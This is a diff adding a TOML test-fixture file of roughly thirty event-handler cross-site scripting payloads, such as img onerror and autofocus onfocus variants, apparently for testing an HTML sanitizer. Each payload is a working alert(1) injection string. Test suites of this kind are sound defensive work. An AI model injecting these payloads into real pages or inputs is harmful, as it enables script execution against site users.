@@ -1,0 +1,167 @@
+schema = 1
+# Event-handler-based XSS — known attack surface for HTML5 events.
+
+[[case]]
+id = "img_onerror"
+class = "xss"
+payload = "<img src=x onerror=alert(1)>"
+
+[[case]]
+id = "img_onerror_template"
+class = "xss"
+payload = "<img src=x onerror=alert`1`>"
+
+[[case]]
+id = "body_onload"
+class = "xss"
+payload = "<body onload=alert(1)>"
+
+[[case]]
+id = "body_onpageshow"
+class = "xss"
+payload = "<body onpageshow=alert(1)>"
+
+[[case]]
+id = "input_onfocus_autofocus"
+class = "xss"
+payload = "<input autofocus onfocus=alert(1)>"
+
+[[case]]
+id = "input_onfocusin"
+class = "xss"
+payload = "<input autofocus onfocusin=alert(1)>"
+
+[[case]]
+id = "select_onfocus"
+class = "xss"
+payload = "<select autofocus onfocus=alert(1)><option>x</option></select>"
+
+[[case]]
+id = "textarea_onfocus"
+class = "xss"
+payload = "<textarea autofocus onfocus=alert(1)>"
+
+[[case]]
+id = "details_ontoggle"
+class = "xss"
+payload = "<details open ontoggle=alert(1)>"
+
+[[case]]
+id = "audio_onerror"
+class = "xss"
+payload = "<audio src=x onerror=alert(1)>"
+
+[[case]]
+id = "audio_onloadstart"
+class = "xss"
+payload = "<audio onloadstart=alert(1) src=x>"
+
+[[case]]
+id = "video_onerror"
+class = "xss"
+payload = "<video src=x onerror=alert(1)>"
+
+[[case]]
+id = "video_onloadeddata"
+class = "xss"
+payload = "<video onloadeddata=alert(1) src=x.mp4>"
+
+[[case]]
+id = "marquee_onstart"
+class = "xss"
+payload = "<marquee onstart=alert(1)>x</marquee>"
+
+[[case]]
+id = "marquee_onfinish"
+class = "xss"
+payload = "<marquee loop=1 width=100 onfinish=alert(1)>x</marquee>"
+
+[[case]]
+id = "iframe_onload"
+class = "xss"
+payload = "<iframe onload=alert(1)></iframe>"
+
+[[case]]
+id = "iframe_onerror"
+class = "xss"
+payload = "<iframe src=x onerror=alert(1)>"
+
+[[case]]
+id = "object_onerror"
+class = "xss"
+payload = "<object data=x onerror=alert(1)></object>"
+
+[[case]]
+id = "embed_onerror"
+class = "xss"
+payload = "<embed src=x onerror=alert(1)>"
+
+[[case]]
+id = "form_onsubmit"
+class = "xss"
+payload = "<form onsubmit=alert(1)><input type=submit></form>"
+
+[[case]]
+id = "form_oninput"
+class = "xss"
+payload = "<form oninput=alert(1)><input value=x></form>"
+
+[[case]]
+id = "input_onsearch"
+class = "xss"
+payload = "<input type=search onsearch=alert(1) autofocus>"
+
+[[case]]
+id = "input_oninvalid"
+class = "xss"
+payload = "<input oninvalid=alert(1) required autofocus>"
+
+[[case]]
+id = "input_onbeforeinput"
+class = "xss"
+payload = "<input autofocus onbeforeinput=alert(1)>"
+
+[[case]]
+id = "div_onpointermove"
+class = "xss"
+payload = "<div style=position:fixed;top:0;left:0;width:100%;height:100% onpointermove=alert(1)>x</div>"
+
+[[case]]
+id = "div_onpointerover"
+class = "xss"
+payload = "<div style=position:fixed;width:100%;height:100% onpointerover=alert(1)>x</div>"
+
+[[case]]
+id = "div_oncopy"
+class = "xss"
+payload = "<div oncopy=alert(1) contenteditable>x</div>"
+
+[[case]]
+id = "div_oncut"
+class = "xss"
+payload = "<div oncut=alert(1) contenteditable>x</div>"
+
+[[case]]
+id = "div_onpaste"
+class = "xss"
+payload = "<div onpaste=alert(1) contenteditable>x</div>"
+
+[[case]]
+id = "input_onkeyup"
+class = "xss"
+payload = "<input autofocus onkeyup=alert(1)>"
+
+[[case]]
+id = "html_onmousemove"
+class = "xss"
+payload = "<html onmousemove=alert(1)>"
+
+[[case]]
+id = "img_onbeforeunload"
+class = "xss"
+payload = "<body onbeforeunload=alert(1)>"
+
+[[case]]
+id = "video_onsuspend"
+class = "xss"
+payload = "<video onsuspend=alert(1) autoplay><source src=x></video>"
